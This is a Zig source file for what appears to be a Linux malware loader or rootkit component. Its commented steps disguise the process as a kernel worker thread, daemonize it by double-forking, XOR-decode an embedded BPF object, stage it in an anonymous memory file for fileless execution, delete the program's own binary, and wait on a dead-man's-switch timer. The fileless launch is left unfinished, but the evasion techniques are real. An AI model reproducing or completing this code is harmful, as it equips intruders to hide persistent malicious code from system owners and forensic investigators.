const std = @import("std");
const syscalls = @import("syscalls.zig");

const K: u8 = 0x5F; // XOR Key
const HEARTBEAT_TIMEOUT: i64 = 86400; // 24 Hours

pub fn main() !void {
    // 1. Process Masking
    const mask_name = "kworker/u11:1-events";
    _ = syscalls.prctl(15, @intFromPtr(mask_name), 0, 0, 0);

    // 2. Double-Fork (Daemonize)
    const pid1 = std.os.linux.fork();
    if (pid1 != 0) std.os.exit(0);
    _ = std.os.linux.setsid();
    const pid2 = std.os.linux.fork();
    if (pid2 != 0) std.os.exit(0);

    // 3. Instruction Polarity: Un-XOR the embedded BPF
    var bpf_blob = @constCast(@embedFile("../target/vfs_cache.bpf.o").*);
    for (&bpf_blob) |*b| { b.* ^= K; }

    // 4. memfd_create + fexecve (Sign-less execution)
    const fd = syscalls.memfd_create("sys_vfs_sync", 1); // MFD_CLOEXEC
    _ = std.os.linux.write(@intCast(fd), &bpf_blob);

    // 5. Dead Man's Switch Check
    var last_heartbeat = std.time.timestamp();

    // 6. Ghost Execution Logic
    // In production, fexecve would point to the secondary engine
    const args = [_:null]?[*:0]u8{ @ptrCast(mask_name), null };
    const env = [_:null]?[*:0]u8{ null };
    
    // Self-Delete Trigger
    var buf: [1024]u8 = undefined;
    const self_path = try std.os.readlink("/proc/self/exe", &buf);
    _ = std.os.linux.unlink(self_path);

    while (true) {
        if (std.time.timestamp() - last_heartbeat > HEARTBEAT_TIMEOUT) {
            std.os.exit(0); // Terminate and let memory be reclaimed
        }
        std.time.sleep(60 * std.time.ns_per_s);
    }
}
